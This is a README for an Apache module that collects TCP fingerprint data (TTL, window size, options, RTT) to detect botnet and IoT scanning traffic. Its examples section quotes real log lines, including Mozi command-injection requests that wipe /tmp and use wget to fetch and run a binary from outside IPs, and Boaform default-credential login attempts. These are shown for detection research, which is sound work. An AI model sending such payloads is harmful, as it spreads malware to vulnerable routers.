# mod_tcpfingerprint

A module that retrieves tcp fingerprinting data from the Linux kernel (SAVED_SYN and TCP_INFO) and makes it available for logging and environment variables for scripts. Since SAVED_SYN is Linux specific, this is Linux only.

Currently, this module exposes the attributes useful for TCP fingerprinting. Future work includes integrating a reliable fingerprint database (when it exists) and blocking connections based on fingerprints.

## Installation/Usage

To use this module, compile and install.

```
sudo apxs2 -iac mod_tcpfingerprint.c
```

Then either add to LogFormat defintion or turn TCPFingerprintEnvVars on and use in cgi scripts.

```
LogFormat ... %{FINGERPRINT_TCP_RTT}g %{FINGERPRINT_IP_TTL}g %{FINGERPRINT_TCP_WSIZE}g %{FINGERPRINT_TCP_WSCALE}g %{FINGERPRINT_TCP_OPTIONS}g %{FINGERPRINT_TCP_MSS}g"
```

## Configuration Directives

This module registers "g" for LogFormat directives. Ex. ```%{FINGERPRINT_TCP_OPTIONS}g```

Server Directives (connection level):
  - TCPFingerprintGetSavedSYN: Enable collection of SAVED_SYN from kernel using getsockopt, default on
  - TCPFingerprintGetTCPInfo: Enable collection of TCP_INFO from kernel using getsockopt, default on

Directory Directives (request level):

  - TCPFingerprintEnvVars: Enable creation of CGI environment variables, default off (similar to StdEnvVars of for modssl)
  - TCPFingerprintEnvTCPInfo: Enable dump of raw TCP_INFO in environment variables, default off
  - TCPFingerprintEnvSavedSYN: Enable dump of raw SAVED_SYN in environment variables, default off

This module will instruct the kernel to SAVE_SYN on all apache Listen sockets (all incoming connections). In some cases the kernel does not preserve SYN packets--ex. if a SYN flood causes SYN cookies to be used. 

## Attributes

List of variables exposed

TCP_INFO
 - TCP_RTT - FINGERPRINT_TCP_RTT

SAVED_SYN
 - IP TTL - FINGERPRINT_IP_TTL
 - IP DF - FINGERPRINT_IP_DF
 - IP ECN - FINGERPRINT_IP_ECN
 - Window Size - FINGERPRINT_TCP_WSIZE
 - Option IDs - FINGERPRINT_TCP_OPTIONS
 - Option values
   - MSS - FINGERPRINT_TCP_MSS
   - Window Scale - FINGERPRINT_TCP_WSCALE
 - TCP ECN - FINGERPRINT_TCP_ECN

Full Structures (hex encoded)
 - SAVED_SYN - FINGERPRINT_SAVED_SYN
 - TCP_INFO - FINGERPRINT_TCP_INFO

Timestamp
 - connection accept time - ~~FINGERPRINT_ACCEPT_TIME~~
   - Not currently implemented, unable to get actual connection establishment time using existing hooks

## Motivation/Examples

TCP Fingerprinting is useful for many applications, here we show example data matching two common botnet propagation patterns collected by observing natural internet scanning from a single IP. 

For ease of replication, these examples are the of the simplest, noisiest, and least sophisticated threats. However, this type of analysis isn't limited to detecting mere internet scanning noise, many residential proxy botnets can be detected using similar hueristics. More advanced detections and use cases exist. 

We show that it's easy and efficient to collect this information at the request level. Cloud providers--please give us the option to get this sort of information for our tenants!

The following fields are shown in these examples:

```
%{FINGERPRINT_TCP_RTT}g %{FINGERPRINT_IP_TTL}g %{FINGERPRINT_TCP_WSIZE}g %{FINGERPRINT_TCP_WSCALE}g %{FINGERPRINT_TCP_OPTIONS}g %{FINGERPRINT_TCP_MSS}g \"%r\"
```

### Mozi
```
2180970 50 28800 4 2,4,8,1,3 1406 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://45.164.178.64:10368/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
4020319 49 29040 5 2,4,8,1,3 1452 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://119.117.156.111:43636/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
 563328 49 29040 5 2,4,8,1,3 1400 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://115.63.48.207:54752/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
1097078 45  5808 1 2,4,8,1,3 1452 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://102.33.37.29:41084/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
```
### Boaform
```
2629368 50 28800 4 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
3608747 47  5808 5 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
4969075 44  5808 2 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
 454541 49 29040 5 2,4,8,1,3 1400 "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
3019585 49  5808 5 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
2423828 49 28800 4 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
3114062 45  5808 2 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
2260885 49 28800 4 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
2549609 49 28800 5 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
```
### Observations

These devices can be identified as Linux using TCP options, TTL < 64, and window size that is usually a function of MSS (note specific MSS/window size pairs).

The requests can all be identified as embedded linux using windows scale. For many of the versions of linux seen on these types of devices, when memory is low (~<2GB) then window scale is based indirectly on memory size. All of the above requests appear to originate from embedded linux devices such as routers, modems, IoT devices, etc. In most environments it would be acceptable to simply block or otherwise considering as fradulent any traffic matching specific TCP fingerprints.

The RTTs observed are extreme outliers. This excessive latency is likely an artifact of limited processor power/asynchronous scanning software rather than signal propogation delay or packet loss due to unreliable networks.

## Potential Future Work

Implement TCP handshake RTT calculation. RFC on methods for getting handshake RTT (delta between SYN and first ACK) or accurate connection establishment timestamp from module.

Integrate database for known fingerprints whenever a solid database becomes available.

Possibly block connections based on database of likely compromised devices (ex. embedded linux as seen in compromised routers/IoT devices)

Possibly collect TCP_INFO at request time (instead of at start of connection) for meaningful collection of other TCP_INFO attributes. This might be better accomplished in a separate module that uses netlink to get TCP_INFO.

More TCP_INFO attributes: Option to collect the whole TCP_INFO struct available with current kernel version. Current implementation just collects standard length struct (defined in netinet/tcp.h). Potentially have runtime option to set max size of struct to collect? Possibly have more attributes from TCP_INFO exposed.

Configuration directive to configure SAVE_SYN on a per Listen basis. RFC on what this should look like.

## Tasks

 - ~~basic module skeleton~~
 - ~~Collect TCP_INFO~~
 - ~~Expose TCP_INFO Data~~
 - ~~retrival functions for variables (work for both logging callback and adding vars to env)~~
   - ~~Callback function for logging~~ Done, uses %{VARNAME}g for CustomLog definition
 - ~~Collect TCP_SAVED_SYN~~
   - ~~Patch for apache to set TCP_SAVE_SYN on listen socket(s)~~ -- Not necessary, set in module callback
 - ~~Expose TCP_SAVED_SYN~~
   - ~~Parse syn_packet~~
     - IPv4 and TCP implemented, IPv6 with extensions needs tested
 - ~~Fix debug/error message (many current errors should be deleted or changed to debug)~~
 - ~~Implement TCP connection timestamp to compare to TLS Hello timestamp for hello_delay calculation~~
 - ~~Look for additional features in TCP_INFO for inclusion~~
 - Get TCP Hanshake RTT (or get timestamp of accept?)
   - ~~Try min_rtt from extended linux attributes~~ -- doesn't appear to work, is same as rtt
   - ~~Try tcpi_rcv_rtt~~ -- what does this mean, does it require timestamps by client. Doesn't appear to be set at start of connection regardless.
   - ~~Try delta between last_data_recv and last_ack_recv~~--this doesn't work because most data packets also include ACK so we cant get time of ACK at end of TCP handshake
   - ~~Try implementing collection of timestamp at ap_hook_create_connection hook~~--see if timestamp is actually end of TCP handshake
     - This is called if done before core
       - Check timestamp, make sure this actually reflects handshake RTT (vs. payload)--it doesn't, this doesn't work--it's comparable to the pre_connection hook--need to find an earlier hook?
   - get accept timestamp in the following way:
       - Get timestamp during ap_hook_create_connection
       - Check if APR_TCP_DEFER_ACCEPT impacts ability to get accurate accept timestamp
       - Check if APR_POLLOUT option impacts ability to get accurate accept timestamp
 - Configurations
   - Per Listener
     - **(Too complicated, not sure what's really wanted)** Configure which listeners should have SAVE_SYN set
       - Current/default behavior is to cause kernel to collect SAVED_SYN for all connections
         - This kernel mechanism is fairly efficient and is disabled in SYN floods by SYN cookie protections, etc--so cost is pretty low
       - Directive would be similar to Listen or ListenBackLog--but ListenBackLog are available in global scope only
         - There is no per Listener configuration tracking like there is for server and directory configuration, so this is pretty difficult
       - Maybe list of IPs/ports which should have SAVE_SYN applied (or not applied) like Listen, something like TCPFingerprintSaveSYNExclude with same params as Listen.
         - This would be possible, but is a lot of parsing comparison code for relatively little benefit and would require testing all sorts of edge cases
       - Is there a way to get listen record from server config? Maybe set that way instead of global config?
       
   - Per Connection
     - ~~Determine if SAVED_SYN and TCP_INFO should be retrieved for the current connection. (this is moderately expensive, copies ~300 bytes of data to connection)~~
       - ~~Currently this is prior to reception of data on port, prior to knowledge of SNI or HTTP virtualhost, so most selectors aren't available.~~
         - ~~If this was delayed until later, could select upon virtualhost~~
     - Done: TCPFingerprintGetSavedSYN, TCPFingerprintGetTCPInfo which will default to on and are server only in scope
   - Per Request
     - ~~Enable export of environment variables--like STDENVVARS.~~   Done: TCPFingerprintEnvVars
     - ~~Enable full SYN printing (hex encoded), this is typically about 60 bytes/120 hex chars~~ Done: TCPFingerprintEnvSavedSYN
     - ~~Enable full TCP_INFO printing (hex encoded)~~ Done: TCPFingerprintEnvTCPInfo
       - Are these, should these be server/vhost compatable also?
      - **(PUNT FOR NOW)** TCP_INFO could be retrieved later (possibly per request) to collect other data like max observed packet size and RTT based on more data
         - Getting SAVED_SYN and TCP_INFO currently requires putting socket in blocking mode--is this safe to do later?
           - Is this safe to do at start of connection?
      - switch to netlink instead of getsockopt?
        - If this was implemented, desired additional TCP_INFO attributes:
          - tcpi_rcv_mss (max observed payload size)
 - Database
   - Database of TCP fingerprints, especially SOHO router/IoT devices (right now an effective database does not exist)
   - Configuration for one database to create a label per client (env variable and logging attribute)
   - Possible implementations
     - Whatever database becomes available
     - p0f -- database is out of date and code hasn't been updated but it would be easy to implement
     - yara
   - Possibly use database to block unwanted connections

## References:

### netlink

https://www.kernel.org/doc/html/next/userspace-api/netlink/intro.html

https://blog.mygraphql.com/en/notes/low-tec/network/tcp-inspect/#rationale---how-ss-work

### Relevant Apache module development example

https://www.tirasa.net/en/blog/developing-custom-apache2-module

### Linux SYN handling (when SAVED_SYN is available)

https://blog.cloudflare.com/syn-packet-handling-in-the-wild/

### Linux kernel TCP_INFO

https://www.youtube.com/watch?v=ZUihWPyt_zo&t=1994s



